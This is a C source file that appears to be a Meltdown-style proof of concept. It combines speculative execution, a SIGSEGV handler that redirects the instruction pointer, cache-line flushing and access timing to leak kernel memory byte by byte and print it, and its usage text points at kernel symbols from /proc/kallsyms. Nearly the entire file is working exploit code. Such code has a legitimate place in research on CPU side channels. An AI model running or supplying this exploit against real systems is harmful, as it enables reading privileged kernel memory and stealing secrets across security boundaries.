#define _GNU_SOURCE // REG_RIP
#include <stdio.h>  // printf
#include <string.h> // memset
#include <fcntl.h>  // O_RDONLY
#include <ucontext.h>
#include <ctype.h>  // isprint
#include <unistd.h> // pread
#include <signal.h> // sigaction
#include "cache_time.h" // get_access_time

#define TARGET_SIZE 4096 // separate each Byte by 4KB to avoid prefetcher
#define VARIANTS_READ 256

static int cache_hit_threshold;
static char target_array[VARIANTS_READ * TARGET_SIZE];

extern char stopspeculate[];

void sigsegv(int sig,siginfo_t *siginfo, void *context)
{
  ucontext_t *ucontext = context;
  ucontext->uc_mcontext.gregs[REG_RIP] = (unsigned long)stopspeculate;
  return;
}

int set_signal(void)
{ // catch and handle segmentation fault
  struct sigaction act = {
    .sa_sigaction = sigsegv,
    .sa_flags = SA_SIGINFO,
  };
  return sigaction(SIGSEGV,&act,NULL);
}

static void __attribute__((noinline))
speculate(unsigned long addr)
{
  asm volatile (
    "1:\n\t"

    ".rept 300\n\t"
    "add $0x141, %%rax\n\t"
    ".endr\n\t"

    "movzx (%[addr]), %%eax\n\t"
    "shl $12, %%rax\n\t"
    "jz 1b\n\t"
    "movzx (%[target], %%rax, 1), %%rbx\n"

    "stopspeculate: \n\t"
    "nop\n\t"
    :
    : [target] "r" (target_array),
      [addr] "r" (addr)
    : "rax", "rbx"
  );
}

static int hist[VARIANTS_READ];
void check(void)
{ // secret increments hist[secret]
  int i, time;
  volatile char *addr;

  for (i = 0; i < VARIANTS_READ; i++) {
    addr = &target_array[i * TARGET_SIZE];
    time = get_access_time(addr);

    if (time <= cache_hit_threshold)
      hist[i]++;
  }
}

void clflush_target(void)
{ // cache line flush: empty all cached values of target_array
  int i;

  for (i = 0; i < VARIANTS_READ; i++)
  {
    _mm_clflush(&target_array[i * TARGET_SIZE]);
  }
}

#define CYCLES 1000 // number of Bytes to histogram, increase robustness
int readbyte(int fd, unsigned long addr)
{
  int i, ret = 0, max = -1, maxi = -1;
  static char buf[256];

  // clear secret byte histogram
  memset(hist, 0, sizeof(hist));

  for (i = 0; i < CYCLES; i++) {
    ret = pread(fd, buf, sizeof(buf), 0);

    // cache line flush: empty all cached values of target_array
    clflush_target();
    // use addr byte to access target_array
    speculate(addr);
    // check access time to target_array, infer addr byte
    check();
  }

  // deduce secret byte from histogram
  for (i = 1; i < VARIANTS_READ; i++) {
    if (!isprint(i))
      continue;
    if (hist[i] && hist[i] > max) {
      max = hist[i];
      maxi = i;
    }
  }

  return maxi;
}

static char *progname;
int usage(void)
{
  printf("%s: [hexaddr] [size] [cache_hit_threshold]\n\
 [hexaddr] starting physical address e.g. /proc/kallsyms 'linux_proc_banner'\n\
 [size] is the number of bytes to read\n\
 [cache_hit_threshold] should be 20~80 on modern intel\n\
 ", progname);
 
  return 2;
}

int main(int argc, char *argv[])
{
  int ret, fd, i;
  unsigned long addr, size;

  progname = argv[0];
  if (argc < 4)
    return usage();

  if (sscanf(argv[1], "%lx", &addr) != 1)
    return usage();

  if (sscanf(argv[2], "%lx", &size) != 1)
    return usage();

  if (sscanf(argv[3], "%lx", &cache_hit_threshold) != 1)
    return usage();

  memset(target_array,1,sizeof(target_array));
  ret = set_signal(); // handle SIGSEGV

  fd = open("/proc/version", O_RDONLY);
  
  printf(" printing kernel memory:\n");
  for (i = 0; i < size; i++) {
    ret = readbyte(fd, addr);
    if (ret == -1)
      ret = 0xff;
    printf("%c",ret);
    fflush(stdout);

    addr++;
  }
  printf("\n");

  close(fd);
}
